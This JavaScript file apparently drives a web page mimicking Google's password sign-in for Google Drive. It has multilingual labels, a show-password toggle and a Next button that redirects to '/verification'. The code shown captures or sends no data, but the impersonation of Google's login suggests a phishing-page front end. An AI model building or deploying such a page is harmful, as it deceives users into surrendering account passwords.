document.addEventListener("DOMContentLoaded", function () {
    const translations = {
        en: {
            googleLogoAlt: "Google Logo",
            headerText: "Sign in",
            subtitleText: "to continue to Google Drive",
            passwordPlaceholder: "Enter your password",
            passwordLabel: "Enter your password",
            showPasswordLabel: "Show password",
            forgotPassword: "Forgot Password?",
            nextButton: "Next",
            languageDropdown: "English (United States)",
            helpLink: "Help",
            privacyLink: "Privacy",
            termsLink: "Terms",
        },
        "en-uk": {
            googleLogoAlt: "Google Logo",
            headerText: "Sign in",
            subtitleText: "to continue to Google Drive",
            passwordPlaceholder: "Enter your password",
            passwordLabel: "Enter your password",
            showPasswordLabel: "Show password",
            forgotPassword: "Forgot Password?",
            nextButton: "Next",
            languageDropdown: "English (United Kingdom)",
            helpLink: "Help",
            privacyLink: "Privacy",
            termsLink: "Terms",
        },
        de: {
            googleLogoAlt: "Google-Logo",
            headerText: "Anmelden",
            subtitleText: "um fortzufahren zu Google Drive",
            passwordPlaceholder: "Geben Sie Ihr Passwort ein",
            passwordLabel: "Geben Sie Ihr Passwort ein",
            showPasswordLabel: "Passwort anzeigen",
            forgotPassword: "Passwort vergessen?",
            nextButton: "Weiter",
            languageDropdown: "Deutsch",
            helpLink: "Hilfe",
            privacyLink: "Datenschutz",
            termsLink: "Nutzungsbedingungen",
        },
        "es-es": {
            googleLogoAlt: "Logotipo de Google",
            headerText: "Iniciar sesión",
            subtitleText: "para continuar a Google Drive",
            passwordPlaceholder: "Introduce tu contraseña",
            passwordLabel: "Introduce tu contraseña",
            showPasswordLabel: "Mostrar contraseña",
            forgotPassword: "¿Olvidaste tu contraseña?",
            nextButton: "Siguiente",
            languageDropdown: "Español (España)",
            helpLink: "Ayuda",
            privacyLink: "Privacidad",
            termsLink: "Términos",
        },
        "es-la": {
            googleLogoAlt: "Logotipo de Google",
            headerText: "Iniciar sesión",
            subtitleText: "para continuar a Google Drive",
            passwordPlaceholder: "Introduce tu contraseña",
            passwordLabel: "Introduce tu contraseña",
            showPasswordLabel: "Mostrar contraseña",
            forgotPassword: "¿Olvidaste tu contraseña?",
            nextButton: "Siguiente",
            languageDropdown: "Español (Latinoamérica)",
            helpLink: "Ayuda",
            privacyLink: "Privacidad",
            termsLink: "Términos",
        },
        et: {
            googleLogoAlt: "Google'i logo",
            headerText: "Logi sisse",
            subtitleText: "jätkamiseks Google Drive'iga",
            passwordPlaceholder: "Sisestage oma parool",
            passwordLabel: "Sisestage oma parool",
            showPasswordLabel: "Näita parooli",
            forgotPassword: "Unustasid parooli?",
            nextButton: "Järgmine",
            languageDropdown: "eesti",
            helpLink: "Abi",
            privacyLink: "Privaatsus",
            termsLink: "Tingimused",
        },
        fil: {
            googleLogoAlt: "Google Logo",
            headerText: "Mag-sign in",
            subtitleText: "para magpatuloy sa Google Drive",
            passwordPlaceholder: "Ilagay ang iyong password",
            passwordLabel: "Ilagay ang iyong password",
            showPasswordLabel: "Ipakita ang password",
            forgotPassword: "Nakalimutan ang Password?",
            nextButton: "Susunod",
            languageDropdown: "Filipino",
            helpLink: "Tulong",
            privacyLink: "Privacy",
            termsLink: "Mga Tuntunin",
        },
        "fr-ca": {
            googleLogoAlt: "Logo Google",
            headerText: "Se connecter",
            subtitleText: "pour continuer vers Google Drive",
            passwordPlaceholder: "Entrez votre mot de passe",
            passwordLabel: "Entrez votre mot de passe",
            showPasswordLabel: "Afficher le mot de passe",
            forgotPassword: "Mot de passe oublié ?",
            nextButton: "Suivant",
            languageDropdown: "Français (Canada)",
            helpLink: "Aide",
            privacyLink: "Confidentialité",
            termsLink: "Conditions",
        },
        id: {
            googleLogoAlt: "Logo Google",
            headerText: "Masuk",
            subtitleText: "untuk melanjutkan ke Google Drive",
            passwordPlaceholder: "Masukkan sandi Anda",
            passwordLabel: "Masukkan sandi Anda",
            showPasswordLabel: "Tampilkan sandi",
            forgotPassword: "Lupa Kata Sandi?",
            nextButton: "Berikutnya",
            languageDropdown: "Bahasa Indonesia",
            helpLink: "Bantuan",
            privacyLink: "Privasi",
            termsLink: "Persyaratan",
        },
    };

    const updateLanguage = (lang) => {
        const translation = translations[lang];
        if (translation) {
            document.querySelector(".login-header").textContent =
                translation.headerText;
            document.querySelector(".login-subtitle").textContent =
                translation.subtitleText;
            document.querySelector(".floating-label").textContent =
                translation.passwordLabel;
            document.querySelector(".input-field").placeholder =
                translation.passwordPlaceholder;
            document.querySelector("label[for='showPassword']").textContent =
                translation.showPasswordLabel;
            document.querySelector(".forgot-password").textContent =
                translation.forgotPassword;
            document.querySelector(".next-button").textContent =
                translation.nextButton;
            const footerLinks = document.querySelectorAll(".TNC a");
            footerLinks[0].textContent = translation.helpLink;
            footerLinks[1].textContent = translation.privacyLink;
            footerLinks[2].textContent = translation.termsLink;
        }
    };

    const dropdownButton = document.getElementById("languageDropdown");
    const dropdownMenu = document.getElementById("dropdownMenu");
    const dropdownArrow = document.getElementById("dropdownArrow");

    dropdownButton.addEventListener("click", () => {
        dropdownMenu.classList.toggle("show");
        dropdownArrow.classList.toggle("up");
    });

    const dropdownItems = dropdownMenu.querySelectorAll(".dropdown-item");
    dropdownItems.forEach((item) => {
        item.addEventListener("click", (event) => {
            dropdownItems.forEach((i) => i.classList.remove("selected"));
            event.target.classList.add("selected");
            const selectedLang = event.target.getAttribute("data-lang");
            dropdownButton.childNodes[0].textContent = event.target.textContent;
            updateLanguage(selectedLang);
            dropdownMenu.classList.remove("show");
            dropdownArrow.classList.remove("up");
        });
    });

    document.addEventListener("click", (event) => {
        if (
            !dropdownButton.contains(event.target) &&
            !dropdownMenu.contains(event.target)
        ) {
            dropdownMenu.classList.remove("show");
            dropdownArrow.classList.remove("up");
        }
    });

    const showPasswordCheckbox = document.getElementById("showPassword");
    const passwordInput = document.getElementById("password");

    showPasswordCheckbox.addEventListener("change", () => {
        if (showPasswordCheckbox.checked) {
            passwordInput.type = "text";
        } else {
            passwordInput.type = "password";
        }
    });

    const nextButton = document.querySelector(".next-button");
    const errorText = document.getElementById("error-text");
    const loginContainer = document.querySelector(".login-container");

    nextButton.addEventListener("click", () => {
        if (passwordInput.value.trim() === "") {
            errorText.style.display = "block";
            errorText.textContent = "Please enter your password.";
            passwordInput.focus();

            loginContainer.style.height = "455px";
        } else {
            errorText.style.display = "none";
            loginContainer.style.height = "425px";

            window.location.href = "/verification";
        }
    });

    passwordInput.addEventListener("input", () => {
        if (passwordInput.value.trim() !== "") {
            errorText.style.display = "none";

            loginContainer.style.height = "425px";
        }
    });
});
